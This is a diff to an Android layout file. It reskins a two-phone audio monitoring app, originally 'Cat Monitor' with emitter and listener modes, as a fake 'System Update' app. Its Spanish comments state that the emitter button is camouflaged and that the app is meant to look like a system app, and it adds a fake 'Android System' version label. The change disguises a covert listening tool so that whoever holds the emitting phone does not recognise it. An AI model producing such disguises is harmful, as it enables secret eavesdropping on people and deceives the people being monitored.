@@ -5,58 +5,60 @@
     android:orientation="vertical"
     android:gravity="center"
     android:padding="32dp"
-    android:background="#1A1A2E">
+    android:background="#F0F0F0">
 
+    <!-- Apariencia de app del sistema -->
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="🐱"
+        android:text="⚙️"
         android:textSize="72sp"
         android:layout_marginBottom="8dp"/>
 
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="Cat Monitor"
-        android:textSize="32sp"
+        android:text="System Update"
+        android:textSize="26sp"
         android:textStyle="bold"
-        android:textColor="#FFFFFF"
+        android:textColor="#333333"
         android:layout_marginBottom="8dp"/>
 
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="Selecciona el modo para este teléfono"
-        android:textSize="14sp"
-        android:textColor="#AAAACC"
+        android:text="Keeping your device up to date"
+        android:textSize="13sp"
+        android:textColor="#888888"
         android:layout_marginBottom="48dp"/>
 
+    <!-- Botón emisor camuflado -->
     <Button
         android:id="@+id/btnServer"
         android:layout_width="280dp"
-        android:layout_height="80dp"
-        android:text="📡  MODO GATO\n(Teléfono junto al gato)"
-        android:textSize="14sp"
-        android:backgroundTint="#E94560"
+        android:layout_height="56dp"
+        android:text="Check for Updates"
+        android:textSize="15sp"
+        android:backgroundTint="#4CAF50"
         android:textColor="#FFFFFF"
-        android:layout_marginBottom="20dp"/>
+        android:layout_marginBottom="16dp"/>
 
+    <!-- Botón receptor normal -->
     <Button
         android:id="@+id/btnClient"
         android:layout_width="280dp"
-        android:layout_height="80dp"
-        android:text="🎧  MODO ESCUCHA\n(Tu teléfono)"
-        android:textSize="14sp"
-        android:backgroundTint="#0F3460"
+        android:layout_height="56dp"
+        android:text="Update History"
+        android:textSize="15sp"
+        android:backgroundTint="#2196F3"
         android:textColor="#FFFFFF"/>
 
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="Ambos teléfonos deben estar en la misma red WiFi"
-        android:textSize="12sp"
-        android:textColor="#666688"
-        android:gravity="center"
+        android:text="Version 4.2.1 • Android System"
+        android:textSize="11sp"
+        android:textColor="#AAAAAA"
         android:layout_marginTop="48dp"/>
 
 </LinearLayout>
